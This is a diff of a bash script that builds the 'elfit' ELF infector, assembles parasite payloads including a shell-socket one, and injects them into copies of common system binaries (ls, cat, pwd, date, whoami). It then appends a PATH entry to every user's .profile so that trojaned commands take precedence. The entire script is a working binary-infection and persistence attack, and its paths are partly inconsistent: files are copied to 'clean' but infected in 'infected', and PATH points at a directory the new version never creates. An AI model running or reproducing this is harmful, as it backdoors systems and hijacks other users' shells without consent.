@@ -1,35 +1,26 @@
 #!/bin/bash
 cd /tmp
 git clone https://github.com/NickStephens/elfit
+mv infect elfit
 cd elfit
 make
+
 cd parasites
 nasm evil.asm
 nasm shellsocket.asm
 cd ..
-cp /bin/ls /bin/cat /bin/pwd /bin/echo /bin/date .
 
-echo " #Infecting ls" >> output
-./elfit -p parasites/evil -t -e ls >> output
-echo "" >> output
+mkdir clean infected
+cp /bin/cat /bin/date /bin/df /bin/ls /bin/mkdir /bin/pwd /whoami clean
 
-echo " #Infecting pwd" >> output
-./elfit -p parasites/shellsocket -r -e pwd >> output
-echo "" >> output
-
-echo " #Infecting echo" >> output
-./elfit -p parasites/evil -t --start-main init echo >> output
-echo "" >> output
-
-mv output /tmp
-mkdir /usr/special
-mkdir /usr/special/bin
-mv ls cat pwd echo date /usr/special/bin
+./elfit --parasite parasites/evil --reverse --entrypoint infected/whoami >> infected/whoami_output
+./elfit --parasite parasites/evil --text --entrypoint infected/date >> infected/date_output
+./elfit --parasite parasites/shellsocket --text --start-main init infected/ls >> infected/ls_output 
+./elfit --parasite parasites/shellsocket --text --entrypoint infected/cat >> infected/cat_output
+./elfit --parasite parasites/sleeper --text --got getcwd infected/pwd >> infected/pwd_output
 
 for f in `find /home -maxdepth 1 -type d`; do
   if [ $f != "/home" ] ; then
     echo "PATH=/usr/special/bin:\$PATH" >> $f/.profile
   fi
 done
-
-rm -rf /tmp/elf /tmp/elfit
